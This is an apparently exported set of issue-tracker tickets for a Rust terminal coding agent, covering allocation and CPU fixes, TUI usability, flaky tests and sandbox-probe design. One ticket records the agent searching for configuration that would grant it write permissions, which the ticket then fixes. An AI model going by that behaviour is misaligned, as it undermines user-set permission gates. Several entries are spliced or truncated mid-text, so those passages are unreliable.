- HOW: (1) Publication: move `output` (edit) / `args.content` (write) into the blocking closure and return it: `let (result, output) = spawn_blocking_scoped(move || { let r = workspace.replace_relative_atomic_expecting(&rel, output.as_bytes(), &expected, &base); (r, output) }).await?; result?;` — `replace_relative_atomic_expecting` takes `&[u8]` (src/paths.rs:584-588), so no API change. (2) Preimage: change `Preimage.bytes` to `Arc<[u8]>` (or `Arc<str>`) and `Preimage::new(bytes: Arc<[u8]>, ..)`; in edit, build `let content: Arc<str> = content.into()` once after UTF-8 validation and derive both `preview_before` (`Arc::clone`) and the Preimage from it; `modified` is then `String::from(&*content)` (one copy, which replaces the current `content.clone()` for the preview rather than adding one). Net: 4S -> 2S peak for edit; write drops two of its three copies the same way (`current: Arc<[u8]>` shared by Preimage and the `preview_before` `std::str::from_utf8(&current)` borrow).
- VERIFY: src/agent/tools/write.rs `overwrite_requires_and_consumes_a_complete_current_read`, `overwrite_rejects_an_intervening_same_length_change`; src/agent/tools/edit.rs `bound_edit_open_and_publish_run_on_the_scoped_blocking_pool`, `symlink_swap_after_permission_check_is_rejected`; src/tests/edit_tests.rs (whole file, `cargo test --bin mini-agent -- edit_tests write_tests --test-threads=1`); file_checkpoints tests in src/session/file_checkpoints.rs (grep `Preimage`). Measure: peak RSS of the edit test on a 1 MiB fixture before/after (`/usr/bin/time -l`), or a counting allocator asserting bytes allocated during `apply` < 3S.
close_reason: Implemented on main in the 2026-10-20 vb5vw wave (perf/<lane> merge), with the bead's pinning tests.

title: Stop the edit fuzzy fallback from allocating an offset map per line and a String+3 Vecs per window
description:
- Priority: P3
- Dimension: cpu
- Confidence: high
- WHAT: When an edit's SEARCH block has no exact or whitespace-normalized hit (every "not found" edit, whether or not `fuzzy:true`), step 3 of `find_best_match` calls `normalize_whitespace` on every content line and every search line; each call builds a full `NormalizedText` including a `source_offsets: Vec<usize>` of `len+1` entries (8 bytes per input byte, ~8x the text size) that is immediately discarded. Then for each of the N candidate windows it builds `window_norm` with `join("\n")`, a `b_chars: Vec<char>` (4 bytes/char) and two DP Vecs. For a 10k-line, 1 MiB file that is ~10k NormalizedText builds (~8 MiB transient), ~40k allocations and ~8 MiB more transient per block — and `content_norm_lines` is rebuilt for every block in the same call (only `NormalizedText` is memoized in the `OnceLock`).
- WHERE: src/agent/tools/edit.rs:273-281 `let search_norm_lines: Vec<String> = search_lines.iter().map(|l| normalize_whitespace(l))` / `let content_norm_lines: Vec<String> = content_lines.iter().map(|line| normalize_whitespace(line))`; src/agent/tools/edit.rs:311-312 `let window_norm = content_norm_lines[start..start + search_lines.len()].join("\n"); let sim = levenshtein_similarity_chars(&search_norm_chars, &window_norm);`; src/agent/tools/normalize.rs:107-109 `pub fn normalize_whitespace(s: &str) -> String { NormalizedText::new(s).text }` with `source_offsets = Vec::with_capacity(s.len() + 1)` at normalize.rs:24; src/agent/tools/normalize.rs:120-122 `let b_chars: Vec<char> = b.chars().collect();` and 141-142 `let mut prev: Vec<usize> = (0..=b_len).collect(); let mut curr = vec![0usize; b_len + 1];`.
- HOW: (1) Add `normalize_line(line: &str) -> String` (or `normalize_whitespace_text`) in normalize.rs that performs the same tab-expansion/trim-end/`\n` logic without the offsets Vec; keep `normalize_whitespace` semantics identical (it is `NormalizedText::new(s).text`, so the single-line fast path must collapse a blank line to "\n" and a non-blank line to `trimmed_with_tabs_expanded + "\n"`). (2) Cache `content_norm_lines` (as `Vec<Vec<char>>` or one `Vec<char>` plus line offsets) next to `NormalizedText` in the `OnceLock` passed to `find_best_match` (make the OnceLock hold a small struct `{ text: NormalizedText, lines: Vec<..> }`). (3) Replace `join` + `b_chars` with a sliding window: pre-collect each normalized content line into `Vec<char>` once, and give `levenshtein_distance` a signature that takes `b: impl Iterator<Item=char>`/`&[char]` slices of a reusable scratch `Vec<char>` built by `extend` from the window's lines with `'\n'` between them (clear + extend per window; no allocation after the first window). (4) Make `prev`/`curr` reusable scratch buffers passed in by the caller (`&mut Vec<usize>` x2), resized per window with `resize`/`clear`.
- VERIFY: src/tests/edit_tests.rs `test_sim_fuzzy_match_must_be_unique`, `test_sim_single_fuzzy_match_echoes_replaced_region`, `test_similarity_fuzzy_fallback_has_a_hard_work_bound`, `edit_fuzzy_opt_in_rejects_low_confidence_and_invalid_modes_atomically`; src/agent/tools/edit.rs `similarity_normalizes_content_lazily_and_once_across_blocks` (1822). Add a normalize.rs test asserting `normalize_line(l) == normalize_whitespace(l)` for a table of lines (tabs, CRLF, trailing spaces, blank, unterminated), and an allocation-count test (global counting allocator in test) showing step 3 on a 2k-line file does O(1) allocations per window.
close_reason: Implemented on main in the 2026-10-20 vb5vw wave (perf/<lane> merge), with the bead's pinning tests.

title: Reuse one read buffer across grep's walk and stop running the regex twice on matched lines
description:
- Priority: P3
- Dimension: cpu
- Confidence: high
- WHAT: Every searched file allocates two fresh Vecs (an 8 KiB sniff prefix plus a `data` buffer sized to the file, i.e. 2 allocations + 1 memcpy of the prefix per file; files >128 KiB go through mmap/munmap on every allocation), allocates `path_str` for every file even when it has no match, and runs the regex a second time (`re.find`) on every emitted line after `is_match` already found it. For a 20k-file walk that is ~40k allocations and ~20k String allocations that are discarded, plus up to `max_results` redundant regex executions per call.
- WHERE: src/agent/tools/grep.rs:184-203 `GrepTool::read_non_binary` — `let mut prefix = Vec::with_capacity(capacity.min(BINARY_SNIFF_BYTES as usize));` (188) and `let mut data = Vec::with_capacity(capacity.min(MAX_SEARCH_FILE_BYTES as usize)); data.extend_from_slice(&prefix);` (197-198); src/agent/tools/grep.rs:329 `let path_str = entry.path.to_string_lossy().to_string();` (before the file is read or matched, inside the `for entry in walker.by_ref()` loop in `search_bound_directory` 289-467); src/agent/tools/grep.rs:229-232 `matched_source_lines` (`re.is_match(line).then_some(index)`), then `re.find(lines[matched_line])` at 385 and `re.find(lines[index])` at 429.
- HOW: (1) Change `read_non_binary` to take `buf: &mut Vec<u8>` owned by `search_bound_directory` (`buf.clear()` per file; `Vec::with_capacity(64 KiB)` once), sniff the first `BINARY_SNIFF_BYTES` into the same buffer (`reader.take(BINARY_SNIFF_BYTES).read_to_end(buf)`), check `is_binary(&buf[..])`, then continue reading into the same buffer; return `Option<&[u8]>`/bool instead of `Option<Vec<u8>>`. `content = String::from_utf8_lossy(&buf)` already borrows. (2) Move `path_str` construction to after `if match_lines.is_empty() { continue; }` (line 365). (3) In the non-multiline branch of `matched_source_lines`, use `re.find(line).map(|m| (index, m.range()))` and store the ranges in the existing `ranges: BTreeMap<usize, Range<usize>>` so lines 385/429 use `match_ranges.get(..)` for both modes and the `if options.multiline {..} else { re.find(..) }` branches collapse.
- VERIFY: existing grep tests pin output: `prefilter_keeps_line_anchored_and_crlf_matches`, `prefilter_is_disabled_for_anchored_patterns`, `context_output_uses_path_colon_line_and_separators_do_not_consume_limit`, `reports_unknown_additional_matches_when_limit_is_hit`, `does_not_report_truncation_when_walker_is_exhausted_at_limit`, `cancelled_turn_keeps_real_grep_read_owned_until_it_finishes`, `grep_skips_files_matching_read_deny_rules` (src/agent/tools/grep.rs:735+). Add a unit test that calls `read_non_binary` twice with one buffer (binary then text) and asserts the second read is not polluted by the first, and a `#[cfg(test)]` counter asserting `re.find` is invoked once per emitted line (or use a `Regex` wrapper in the test). Measure with `cargo test --bin mini-agent -- grep --test-threads=1` plus a quick `Instant` around `search_bound_directory` on the repo root (expect fewer allocations; count with a global-alloc counter in the test).
close_reason: Implemented on main in the 2026-10-20 vb5vw wave (perf/<lane> merge), with the bead's pinning tests.

title: Bare @name matching a persona gives no hint; pickers don't label main-agent vs sub-agent persona
description:

title: Mouse wheel scrolls only one line per event
description:

title: No obvious key to clear the whole multi-line input draft
description:
Source: feedback B6 (reporter: any key is fine as long as it's obvious). Verified on HEAD.

Facts: Ctrl+U deletes buffer start->cursor (src/ui/input/mod.rs:1335-1345), Ctrl+K after cursor, Ctrl+A moves to line start (docs/agent/COMMANDS.md:812-814). title: TUI has no scrollbar or 'new output — End' hint while scrolled up
description:
Source: feedback B5. Verified on HEAD.

Ctrl+End / End (empty input) jump to bottom but are not discoverable. Herdr's scrollbar disappearing is expected (alternate screen, src/ui/terminal.rs) — not a bug.

title: Transient confirmations are written into the transcript instead of the existing toast (show_notice)
description:
Source: feedback B3. Verified on HEAD (with correction: a toast already exists).

Facts: transcript lines via write_ok/write_result (src/ui/slash/mod.rs:390-396): "switched to model:" (slash/mod.rs:283, providers.rs:557), "no pricing known for" (providers.rs:459), "switched subagent to quick model" (providers.rs:1040), "Saved; applies to the next delegation" (slash/config.rs:204), cron confirmations (slash/cron.rs:342). title: /config save message doesn't name the written file and there is no session-only scope

title: /cron list does not show a fire waiting on a permission approval

title: Flaky: config69_retained_clone_partial_failure_and_replacement_are_closed fails in parallel runs (likely closed-fd number reuse)
description:
WHAT: paths::config69_clone_tests::config69_retained_clone_partial_failure_and_replacement_are_closed (src/paths.rs ~4242) failed 1 of 20 multi-threaded iterations on 2026-10-19 and passes alone. Likely cause: the test asserts a descriptor is closed by probing its fd number, and another concurrently running test opens a file that reuses that number. Not env-related (found while verifying mini-agent-dlwxp).
HOW: assert closure without relying on raw fd numbers (e.g. hold a dup/identity of the original file and check its link/refcount via a test seam, or compare st_dev/st_ino of whatever now owns the number with the original), or serialize the test with the existing process lock if no identity check is possible.
VERIFY: run paths:: together with sandbox::sandbox_tests:: and session:: multi-threaded 30x; zero failures.
close_reason: Fixed in 4cdc0d8f (perf2/integration): assert config69 clone closure by file identity, not fd number; 30x multi-threaded paths::+sandbox loop clean. Merged to main.

title: Test hygiene: tests that set ZS_CACHE_DIR via ScopedProcessEnv race with unlocked env readers in parallel runs
description:
WHAT: crate::tests::ScopedProcessEnv (src/tests/mod.rs:6/62, PROCESS_ENV_LOCK) serializes env MUTATORS only; tests that merely read env (process_paths(), Sandbox::get_cached_cache_dir) do not take the lock. A mutator's temporary ZS_CACHE_DIR (deleted when it ends) can therefore leak into a concurrently running test. This caused the 2026-10-19 linux-sandbox-policy failure (sandbox_unavailable_output_command_fails_without_running: 'sandbox Git write-root authority cannot be retained'), fixed for the two sandbox tests in f1471b24 via Sandbox::with_test_cache_dir.

WHERE (remaining mutators of ZS_CACHE_DIR): src/provider_startup_tests.rs:104,219; src/paths.rs:1979,3690; src/startup.rs:5346,5411,5606; src/provider_effort_replay_probe.rs (8 sites); src/ui/mcp_admin_app_tests.rs:255; src/ui/plan.rs:229; src/ui/slash/session_restore_tests.rs:191.

HOW: prefer explicit injection over global env (pass AppPaths / a cache dir into the code under test, as with_test_cache_dir does), or make ScopedProcessEnv a read-write lock that env-reading tests acquire shared. Do not weaken production path resolution.

VERIFY: run the affected modules multi-threaded in a loop (e.g. 30 iterations) together with sandbox::sandbox_tests:: and paths:: readers; CI parallel-test-smoke stays green.
close_reason: [done] ScopedProcessEnv is now an RwLock writer; PathOverrides::from_process takes the shared lock (cfg(test)) so no reader observes a mutator's temp env. Added regression test. | Notes: paths.rs:1979,3690 are pure matrix tests, not mutators. seatbelt_* and extras::js worker tests time out in this nested-sandbox environment (also in isolation), skipped. Follow-up: config69 fd-reuse flake. | merged to main via d11-test-env-race (perf2 round, 2026-10-19).

title: goal driver retries user-gated blockers (allow_write, trust) for 3 rounds instead of parking with the setting
description:
WHAT: When the only blocker is a gate that just the user can open (e.g. a write persona refused because `[subagents] allow_write` is false, an untrusted project config, a missing approval), the goal driver still spends `blocked_rounds` (default 3, src/extras/goal/mod.rs:417/482) retry rounds with "Do not stop for this blocker yet ... Try to remove it or find another route". Observed 2026-10-19: the agent responded by hunting for "a config that allows write subagents" — wasted rounds, and a prompt that nudges the model toward self-modifying its own permissions (content-bound project trust prevents the escalation, but the nudge is wrong).

WHERE: src/extras/goal/driver.rs:348, :450 (blocker handling); src/extras/goal/mod.rs:119, :417-482 (blocked_rounds, stall reason); the refusal text produced by the task tool for write personas without allow_write (src/extras/subagents/task_tool.rs).

HOW: Give user-gated refusals a typed marker (e.g. ToolError / refusal kind `RequiresUserConfiguration { setting }`) that the goal round report can carry. When the round's blocker is exclusively such a marker, park the goal immediately with an actionable message naming the setting ("set [subagents] allow_write = true in your global config, then /goal resume") instead of issuing the retry nudge; never suggest editing permission/trust/sandbox configuration in the nudge text. Free-text blockers keep the existing blocked_rounds behaviour.

VERIFY: goal driver unit test: a round whose only blocker is the typed config gate parks in round 1 with the setting named; a free-text blocker still gets the retry nudge up to blocked_rounds; nudge text contains no instruction to change permissions/config.
close_reason: [done] requires_user_configuration typed marker on the allow_write refusal; RoundCollector and headless summary (task-call results only) set RoundSummary.user_gate; gate parks Blocked in round 1 naming the setting when no edits. Free-text blockers unchanged. | Notes: Only the allow_write refusal is marked; other user-gated refusals (untrusted config, approvals) not yet marked. Marker is part of 5919b4ee task_tool.rs change. Follow-up 2a6f5ff0: untrusted project persona refusal marked (agent_type only in an untrusted project layer). No distinct write-mode-untrusted path exists (same allow_write refusal); no other setting-hinting refusals in src/extras/subagents. builder.rs unused mut cfg-gated. | merged to main via d8-subagents-security (perf2 round, 2026-10-19).

title: Unknown-slash fallback reloads every custom command template from disk although a stamped cache exists
description:
WHAT: Duplicate, uncached directory walk + parse on the UI task right before the command runs; with dozens of templates (this repo's user has ~200 skills/commands listed) it is a visible stall.

WHERE (main at b56d7a74): src/ui/slash/mod.rs:1045-1060; src/context/commands.rs:288-303; src/context/commands.rs:388-443; src/ui/app.rs:6524-6532

HOT PATH: App::handle_slash -> slash::handle (fallback arm) on the UI task, for every custom command invocation (e.g. /commit, /review) and every mistyped command: load_layers reads and YAML-parses every template under ~/.config/.../commands, .claude/commands and .mini-agent/commands, after reading the project config + trust store for the trust decision; App::refresh_custom_commands already fills `custom_command_cache` via load_cached with DirStamps on each '/' keystroke.

EXTRACT:
```rust
_ => {
            if let Some(name) = parts[0].strip_prefix('/')
                && let Some(template) =
                    crate::context::commands::load_for_workspace(ctx.workspace).remove(name)

On a debug install (`cargo install --debug`, several hundred MB) that is 4 full-binary SHA-256 passes plus two sandbox-exec/guardian spawns at every start. It no longer delays the first prompt (runs on the blocking pool), but it burns a CPU core and disk bandwidth during the first seconds of every session and gates the first JS tool call.

WHERE (main at b56d7a74): src/sandbox/worker/macos.rs:381-383; src/sandbox/worker/macos.rs:409-450; src/sandbox/worker/macos.rs:999-1075; src/sandbox/worker/macos.rs:1145-1160; src/sandbox/worker/macos.rs:3340-3420; src/startup.rs:1386; src/sandbox/worker/startup_probe.rs:33-58

        ...

```

description:
WHAT: Deferred /cron items from the design review, filed together; split when picked up. (1) Dynamic mode (Claude Code '/loop <prompt>' without interval): the model chooses the next delay through a TYPED tool call (schedule_wakeup{delay_secs clamped 60..3600, reason, noop}) exposed only during a cron-originated turn — never by parsing response text (tool results could coax a marker); consecutive noop fires collapse in the transcript; Esc clears the pending wakeup. (2) Persistence: Claude Code restores cron tasks on --resume; goals persist in mini-agent too (Session.goal_store, session/mod.rs:771-778). Persist entries DISARMED (serde skip_serializing_if empty, wall-clock next time) and offer '/cron resume' on /resume instead of auto-arming (surprise spend). title: word_wrap measures every word three times
description:
WHAT: markdown::word_wrap first measures display_width(text) over the whole string, then per word computes display_width(word) and display_width(word_trimmed). split_inclusive(char::is_whitespace) yields words with at most one trailing whitespace char, so trimmed_w == word_w - width(that char); two of the three unicode-width passes are redundant. word_wrap runs for every laid-out row (markdown flush_acc, list items, blockquotes, tables, plain_block_lines) and for agent_tail_lines on every repaint of a running block.
WHERE: src/ui/markdown.rs:21-37; callers 120, 330, 371, 380, 408; src/ui/feed.rs:1132, 1667; src/ui/renderer.rs:1037.
HOW: Short-circuit text.len() <= max_width (display width never exceeds byte length) before measuring; compute word_w once and derive trimmed_w from the trailing char's width; track trailing-space count instead of trim_end() copies.

title: Statusline fitting clones every span and recomputes widths on each full bottom draw
description:
WHAT: draw_statusline runs on every full bottom draw (every keystroke) and calls fit_line, which does spans.to_vec() (cloning all span Strings), then display_width for each span twice (fixed-width sum and again while painting), and allocates format!/to_string for the prefix; the built statusline itself is cached by key, but the fitted/painted form is not.
WHERE: src/ui/renderer.rs:1683-1713 (draw_statusline), 1715-1811 (draw_statusline_row); src/ui/statusline.rs:451-480 (fit_line), 564-572 (ellipsize).
HOW: Cache the fitted rows (and their display widths) keyed by (statusline_key, cols, prefix) next to statusline_cache; paint from the cache. With the frame-buffer bead the row then becomes a single memcpy.

title: Feed::compute_lines rebuilds the whole FeedLines index on every generation bump
description:
WHAT: Every token append bumps the feed generation, so the next lines() call runs compute_lines: for each of up to 4096 blocks it clones the cached Vec<Arc<Vec<LineEntry>>> (allocation plus atomic refcount increments per segment) and rebuilds the starts prefix-sum vector. Per-block render caches make this O(blocks) rather than O(bytes), but it is still O(blocks) allocations per paint during streaming.
WHERE: src/ui/feed.rs:286-297 (FeedLines::new), 845-863 (compute_lines), 1049-1073 (block_segments returns cache.segments.clone()).
HOW: Keep the previous LayoutCache and, when only trailing blocks changed since the cached generation (track the lowest mutated block index per generation), reuse the prefix of segments/starts and recompute only the tail; store block segment counts so starts can be extended without touching Arcs.
VERIFY: Feed test with 3000 completed blocks and one running block: appending a token must not clone 3000 segment vectors (assert via a test counter or by timing under cargo test --release-free bound); layout_computes() semantics preserved.

title: Status line overflow clips the last item mid-word (prompt:code shows as prompt:cod) instead of dropping or shortening items by priority
description:
WHAT: When the status line is wider than the terminal, the last item is clipped mid-word: a user saw `mode:yolo prompt:cod` (screenshot, Windows host, 2026-10-13) and asked what "cod" means; it was `prompt:code` minus one character. `draw_statusline_row` (src/ui/renderer.rs:1572-1655) sets `budget = cols`, sums the fixed widths of all Text spans, gives the Flex span only what is left (`budget.saturating_sub(fixed)`, which is 0 on overflow), and then writes each Text span through `crate::ui::utils::display_prefix(text, budget)`, so an overflowing row is truncated character by character from the right. There is no priority order, no whole-item dropping and no abbreviation (for example the context group could shrink to `1%` or the cwd to its basename), and nothing marks the clipping (no `…`). Claude Code, opencode and Codex drop or shorten whole segments when the width shrinks. Also worth checking in the same place: the row writes into the very last column; on terminals with deferred autowrap this is fine, but on legacy Windows console hosts writing the last cell can scroll, so confirm the Windows path reserves it or that ConPTY handles it.

WHERE: src/ui/renderer.rs draw_statusline_row; src/ui/statusline.rs build_line / StatusLineConfig items (add an optional `priority` and `min` form per item, defaults for the built-in layout); docs/agent/CONFIG.md "Status bar".

title: Status line shows cumulative session tokens (⇑134k ⇓1k) next to the context figure (10k/1.0M 1%) with no labels, so the numbers look contradictory
description:
WHAT: The default status line shows `10k/1.0M 1%  ⇑134k ⇓1k` with no labels. The first group is the current context size against the window (`context_used`/`context_max`/`context_percentage`, src/ui/statusline.rs:396-404); the arrows are the session totals of input and output tokens over every model call (`tokens_input`/`tokens_output`, :380-383). Because every tool round trip re-sends the whole context, cumulative input grows by roughly one context size per call (13 calls x ~10k = 134k) while the context stays at 10k, so a user reads "134k up, 1k down, 1% used" as contradictory (observed on a Windows host with glm-5.3, screenshot in the session). Nothing is miscounted; the presentation hides that these are different measures. The cost item that would give the totals meaning is hidden when the model has no catalog price (glm-5.3; see mini-agent-i7ro6.11), and `cache_hit_ratio` is not in the default layout, so the user cannot see that most of the 134k were cache reads.

title: Design retained immutable executable snapshot caching without relaxing per-generation worker proofs
description: WHAT: mini-agent-i7ro6.5 configuration display can skip containment probing safely, but proposed path/size/mtime/ctime/inode digest memoization does not prove unchanged bytes and conflicts with the canonical macOS publisher contract: independently hash both retained descriptors every fresh publication and rehash the one-time image at authenticated Ready. A retained read-only descriptor alone does not freeze mutable source bytes. HOW: first design a bounded process-local, privately owned, sealed/unlinked retained executable snapshot whose already-proven bytes cannot be reached by workers or mutable pathname lookup; specify source identity, descriptor ownership, update/replacement invalidation, fresh per-generation image lifetime, all image/Ready hashes, cancellation and cleanup. Obtain explicit canonical specification amendment/review before reusing any content proof. Persistent metadata-only caches remain forbidden. Measure existing approved binary artifacts and record actual profile/size; do not build release binaries contrary to AGENTS development rules. VERIFY: adversarial source mutation/replacement with matching size/timestamps, retained-object identity, distinct generation images, before-proof startup/Ready attestation, cancellation/reaping/retirement, and native production containment controls. No cached status may advertise an unverified capability; process-local caching cannot by itself remove cross-process cold-start cost. Current .5 delivered portion is config-only and must not be called a worker startup speedup.
design: Independent adversarial design review: no content-proof reuse approved or implemented. Narrow candidate retains first fully proven generation readonly CLOEXEC image FD only after authenticated Ready, fresh Ready SHA256 and identity-bound unlink; commit candidate only after complete native containment matrix succeeds, avoiding eager extra snapshot hash. title: A waiting permission prompt stalls the rest of the event loop (/btw answers, subagent output, titles, MCP notices) and Esc cannot deny-and-stop
description:
WHAT: src/ui/app.rs:1118-1135 awaits `handle_permission_request`, which loops on `user_rx` only (src/ui/permission_handler.rs:158-200). While it waits, `agent_rx`, `btw_rx`, `title_rx`, `tui_log_rx` and MCP notices are not drained, so a `/btw` answer or subagent progress appears only after the prompt is answered. Esc/Ctrl-C in the prompt only denies that one call (`PromptInput::Abort` -> Deny, permission_handler.rs:280); there is no "deny and stop the turn", so the model keeps trying alternatives after a deliberate refusal. Claude Code's prompt offers "No, and tell Claude what to do differently" which ends the turn with a message.

WHERE: src/ui/app.rs permission branch of the select loop; src/ui/permission_handler.rs.

HOW: run the prompt as a state in the main select loop (drain other channels while waiting, rendering them above the prompt as the transcript scroll already allows), and add an answer key that denies and aborts the run with an optional one-line instruction injected as the next user message.

VERIFY: permission_handler.rs tests: a btw result arriving during a prompt is rendered before the answer; new key denies and the run ends with the typed note queued; `cargo test permission`.

title: edit auto-applies fuzzy SEARCH matches at >=85% similarity without confirmation and ignores replace_all for normalized/fuzzy matches
description:
WHAT: src/agent/tools/edit.rs:388-399: only the `MatchResult::Exact` arm consults `replace_all`; `Normalized`/`FuzzyApply` push a single range with a note. `find_best_match` (:286) `if sim >= 0.85 { applicable }` applies the edit silently with a note, so a SEARCH block whose identifier differs materially from the file is rewritten anyway. Claude Code and Codex require exact (whitespace-normalised at most) matches and fail otherwise, which keeps the model honest about what it read. This is the default `similarity` edit system (docs/agent/CONFIG.md "Edit System Modes"), so it affects every edit.

WHERE: src/agent/tools/edit.rs find_best_match, apply path 388-399; src/tests/edit_tests.rs.

HOW: keep normalized (whitespace-only) matches as auto-apply; for fuzzy matches below exact, return an error that shows the best-match preview and asks for an exact block, unless the call passes an explicit `fuzzy: true`; honour `replace_all` for normalized matches (apply to all normalized occurrences) and reject replace_all with fuzzy.

VERIFY: src/tests/edit_tests.rs: fuzzy 90% match errors with preview by default and applies with `fuzzy: true`; replace_all with two normalized occurrences replaces both; `cargo test edit`.

title: Tool argument validation gaps: read limit=0 inverted range, shell timeout silently clamped, todo_write accepts any status, loop guard replaces the third error text
description:

(Raising the cap is the separate "shell wait" feature bead; this item is about saying so.)
  3. `todo_write`: src/agent/tools/todo.rs:22-26 stores free-form status/priority, the schema has no `enum`, `validate_todos` (:136-162) checks length only; `critical_context` (:63) keeps everything not literally completed|cancelled, so "done"/"Completed" items are re-injected into every compaction summary and `format_todos` counts them in no bucket.

Claude Code's tools reject bad arguments with an example call; see bd memory harness-best-practice-digest-2026-09 ("guiding error messages with an example call").

WHERE: files above.

HOW: reject `limit == 0` and out-of-range `timeout` with an example JSON call in the error; `enum` for status/priority in the todo schema plus rejection in validate_todos; append the loop notice to the real error instead of replacing it; char-count padding in list_dir.

title: Session selection wiring: /sessions cannot pick an exact name inside a longer one, --name is dropped with --continue/--session, --continue hides workspace scoping, and /sessions delete can delete the live session
description:

title: Startup spends ~4 s in the JS worker containment probe on this host; cache the executable digest and skip the probe for --print-config
description:
WHAT: On this macOS host every start that makes the `js` tool eligible spends about 4.3 s of CPU before anything happens: `time mini-agent --print-config` = 4.06 s user / 4.5 s wall, `--print-config --no-tools` or `-t read` = 0.035 s, `--no-sandbox` still 4.3 s (so it is the mandatory JS worker containment probe, not the general sandbox). bd memory macos-worker-cold-start-profile-2026-09-08 measured ~1.06 s on an M3 Ultra with a minimal-js debug build and attributes it to hashing the executable three times (source hash ~362 ms, initial image hash ~334 ms, Ready-time image rehash); the installed debug binary here is 115 MB, so the cost scales with binary size and host speed. Claude Code / opencode / Codex start their TUI in well under a second; a multi-second blank start, and the same cost on every `-p` invocation in scripts, is the first impression a user gets.

WHERE: src/sandbox/worker/macos.rs (one-time image digest + Seatbelt preflight), src/extras/js/supervisor.rs (containment_status / Ready-time rehash), src/startup.rs preflight_startup_capabilities and the TUI "pending probe" path (docs/agent/COMMANDS.md "The startup banner reports ... after the containment probe"), src/print.rs for `-p`.

HOW: (1) Measure on a release-profile binary (opt-level z, stripped, ~26 MB) to see whether the cost is a debug-install artefact; record both numbers in docs/benchmarks. (2) Cache the executable digest keyed by (path, size, mtime, ctime, inode) in the private data dir so repeated starts of an unchanged binary skip the source hash, keeping the Ready-time rehash as the security proof; the Phase 6 invariants in docs/specs/phase-6-brokered-js-runtime.md must be preserved, so document which hash is the proof and which is a cache. (3) For `--print-config` and other no-model commands do not run the worker probe at all (it only affects the `js` availability line; print that as "not probed"). (4) In the TUI, confirm the probe never blocks the first keystroke and that `-p` starts the model request while the probe runs, reporting `js` unavailable only if the probe loses the race.

VERIFY: `time mini-agent --print-config` under 0.5 s on a warm cache and the second run of `time mini-agent -p --no-session "say hi"` shows no probe-sized gap before the first provider request (compare `-v` log timestamps); `cargo test` for src/extras/js/tests and sandbox worker tests stays green; the Phase 6 checklist in the spec is updated if any hash semantics change.

title: UI/tools low-severity cluster: ELOOP hint for in-workspace symlinks, todo list caps
description:

see acp/mod.rs:6388 test) but read/edit/write (read.rs:202-204; tools/mod.rs:271-275 From<io::Error>)

hit this and the model loops. FIX: map ELOOP/ENOTDIR from open_relative/open_parent into a ToolError:
"'X' is (or passes through) a symbolic link; workspace-relative access does not follow links. Use the
absolute path of the target to request access through the permission policy." TEST: read/edit/write of
a relative symlinked file returns an error naming the symlink and suggesting the absolute path.
(b) src/agent/tools/todo.rs:43-57, 168-173 has no item count or content length cap; src/session/mod.rs:
1741-1746 and src/ui/mod.rs:1123-1128 re-inject critical_context() (full pretty JSON of every open item)
into every compaction summary, so large todo content can pin context and cause repeated compaction.
FIX: cap items (e.g. 50) and per-item content (e.g. 500 chars) in todo_write with a clear message, and
bound critical_context() output bytes. TESTS: todo_write with 1000 items or a 100 KB string is rejected/
truncated; critical_context() length <= cap.
close_reason: Merged: bound_open_error names the in-workspace symlink component and suggests the absolute path (target disclosed only when inside the workspace); todo_write caps 50 items / 500 chars / 32-char labels with schema hints, critical_context bounded to 32 KiB; tests and TOOL_RUNTIME.md updated.
